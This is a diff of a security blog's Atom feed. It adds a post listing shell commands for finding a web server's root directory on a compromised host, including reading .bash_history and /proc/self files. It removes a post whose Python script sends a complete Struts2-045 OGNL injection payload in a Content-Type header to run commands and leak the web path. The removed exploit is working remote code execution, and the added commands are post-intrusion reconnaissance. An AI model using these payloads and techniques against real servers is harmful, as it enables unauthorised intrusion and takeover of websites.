@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://phpplay.github.io/"/>
-  <updated>2017-07-19T17:08:50.189Z</updated>
+  <updated>2017-10-16T07:40:48.252Z</updated>
   <id>http://phpplay.github.io/</id>
   
   <author>
@@ -14,6 +14,35 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>where is web path</title>
+    <link href="http://phpplay.github.io/2017/10/16/where-is-web-path/"/>
+    <id>http://phpplay.github.io/2017/10/16/where-is-web-path/</id>
+    <published>2017-10-16T07:39:12.000Z</published>
+    <updated>2017-10-16T07:40:48.252Z</updated>
+    
+    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h2 id="where-is-web-path-from-wooyun-zone"><a href="#where-is-web-path-from-wooyun-zone" class="headerlink" title="where is web path (from wooyun zone)"></a>where is web path (from wooyun zone)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">find / -name &quot;*.php&quot;</div><div class="line">find . -name &quot;*.类型&quot; | xargs grep &quot;关键字&quot;</div><div class="line">find / -name nginx.conf</div><div class="line">find / -name httpd.conf</div><div class="line">find robots.txt</div><div class="line">locate robots.txt</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">.bash_history</div><div class="line">httpd,nginx,tomcat,jboss的error_log</div><div class="line">/proc/self/cmdline</div><div class="line">/proc/self/maps</div><div class="line">web容器路径--&gt;配置文件</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">win: findstr /s /i /n /d:C:\ &quot;htmlString&quot; *.*</div><div class="line">linux: find / -name &quot;*.*&quot; | xargs grep &quot;htmlString&quot;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /etc/nginx/conf/vhost/web.conf | grep root</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo &quot;-----------------------start---------------------&quot;;find /etc  -maxdepth 3 -name &quot;*&quot;  2&gt;&amp;1|xargs grep -s -i &apos;root /&apos;| grep -s -i &apos;nginx\|apache&apos;;echo &quot;-----------------------done----------------------&quot;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">For I in (curl http://localhost |grep -oP ([a-Z]&#123;1-6&#125;)[\.js]));do for d in $(find / -name &quot;*.js&quot;);do grep $i  $d;done;done</div><div class="line">没实验，意思是打开首页匹配js文件。系统内搜索所有文件js文件，匹配js文件名</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">win:</div><div class="line">wmic datafile where &quot;filename=&apos;123&apos; and extension=&apos;avi&apos;&quot; get caption</div><div class="line"></div><div class="line">dir /s/a-d/b d:\*重复度较低的文件名（支持通配符）*</div><div class="line"></div><div class="line">where /r c: *.php</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">history | grep cd | grep -v grep | grep -E &apos;www|html|nginx|apache|php|lighttp|web&apos; -i</div><div class="line"></div><div class="line">history | grep -E &apos;cd|vi|ed|nano|et|mkdir|rm|find|ls|mv&apos; | grep -v grep | grep -E &apos;www|html|nginx|apache|php|lighttp|web&apos; -i</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1、netstat -anp | grep [port]   --&gt; PID</div><div class="line">2、ps -p [PID] -o cmd ww   --&gt; PID对应的启动命令（假设存在反向代理，则为bin目录）</div><div class="line">3、cd ../conf   --&gt; 寻找nginx.conf/httpd.conf</div><div class="line">4、通过反向代理ProxyPass/ProxyPassReverse找到对应的webapp端口号port2</div><div class="line">5、netstat -anp | grep [port2]   --&gt; PID2（web app的进程）</div><div class="line">6、ps -p [PID2] -o cmd ww   --&gt; PID2的“Catalina.base”</div><div class="line">7、cd 到“Catalina.base”   --&gt; server.xml</div><div class="line">8、从server.xml中找到appBase 和 docBase</div><div class="line">9、cd 到 $docBase/$appBase，即为当前web app路径。</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;where-is-web-path-from-wooyun-zone&quot;&gt;&lt;a href=&quot;#where-is-web-path-from-wooyun-zone&quot; 
+    
+    </summary>
+    
+    
+      <category term="web" scheme="http://phpplay.github.io/tags/web/"/>
+    
+  </entry>
   
   <entry>
     <title>简单的Wireshark抓包</title>
@@ -37,9 +66,9 @@
     </summary>
     
     
-      <category term="tools" scheme="http://phpplay.github.io/tags/tools/"/>
-    
       <category term="网络安全" scheme="http://phpplay.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="tools" scheme="http://phpplay.github.io/tags/tools/"/>
     
   </entry>
   
@@ -417,9 +446,9 @@
     </summary>
     
     
-      <category term="网络安全" scheme="http://phpplay.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
-    
       <category term="python" scheme="http://phpplay.github.io/tags/python/"/>
+    
+      <category term="网络安全" scheme="http://phpplay.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
     
   </entry>
   
@@ -537,9 +566,9 @@
     </summary>
     
     
-      <category term="网络安全" scheme="http://phpplay.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
-    
       <category term="python" scheme="http://phpplay.github.io/tags/python/"/>
+    
+      <category term="网络安全" scheme="http://phpplay.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
     
   </entry>
   
@@ -579,34 +608,9 @@
     </summary>
     
     
-      <category term="网络安全" scheme="http://phpplay.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
-    
       <category term="python" scheme="http://phpplay.github.io/tags/python/"/>
     
-  </entry>
-  
-  <entry>
-    <title>关于struts2-045漏洞的脚本编写</title>
-    <link href="http://phpplay.github.io/2017/03/14/whoami/"/>
-    <id>http://phpplay.github.io/2017/03/14/whoami/</id>
-    <published>2017-03-14T03:58:35.000Z</published>
-    <updated>2017-03-16T02:42:42.998Z</updated>
-    
-    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h2 id="始末"><a href="#始末" class="headerlink" title="始末"></a>始末</h2><p>&#160; &#160; &#160; &#160;struts2-045漏洞是在2017.3.7被安恒放出的，而很多公司都是在一个月以前获得的通知，所以内部圈子里面都是很早以前就开始玩了。poc在3.7日当天被放出来，所以批量检测工具也很快就被各黑阔论坛开发出来，然而这个时间段很是敏感，所以没爆什么大新闻。<br>&#160; &#160; &#160; &#160;当时自己闲着没事也写一个检测的DEMO，还是很简单的，当时还知道了一个很溜的工具<a href="https://www.getpostman.com/" target="_blank" rel="external">postman</a>。</p>
-<h3 id="我的DEMO"><a href="#我的DEMO" class="headerlink" title="我的DEMO"></a>我的DEMO</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">url=<span class="string">"http://text.com/index.action"</span></div><div class="line">req = urllib2.Request(url)</div><div class="line">req.add_header(<span class="string">'User-agent'</span>,<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>)</div><div class="line">req.add_header(<span class="string">'Content-Type'</span>,<span class="string">"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo 11987654321').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span>)</div><div class="line">res = urllib2.urlopen(req)</div><div class="line">html = res.read()</div><div class="line"><span class="keyword">print</span> html</div><div class="line"><span class="keyword">if</span> <span class="string">"11987654321"</span> <span class="keyword">in</span> html:</div><div class="line">    <span class="keyword">print</span> url + <span class="string">"      is OK"</span></div></pre></td></tr></table></figure>
-<h3 id="获取路径"><a href="#获取路径" class="headerlink" title="获取路径"></a>获取路径</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">req.add_header(<span class="string">'User-agent'</span>,<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>)</div><div class="line">req.add_header(<span class="string">'Content-Type'</span>,<span class="string">"%&#123;(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#luan='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')).(#cmd='echo '+#path).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span>)</div></pre></td></tr></table></figure>
-<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">自己百度吧</div></pre></td></tr></table></figure>]]></content>
-    
-    <summary type="html">
-    
-      &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;始末&quot;&gt;&lt;a href=&quot;#始末&quot; class=&quot;headerlink&quot; title=&quot;始末&quot;&gt;&lt;/a&gt;始末&lt;/h2&gt;&lt;p&gt;&amp;#160; &amp;#160; &amp;#160;
-    
-    </summary>
-    
-    
       <category term="网络安全" scheme="http://phpplay.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="python" scheme="http://phpplay.github.io/tags/python/"/>
     
   </entry>
   
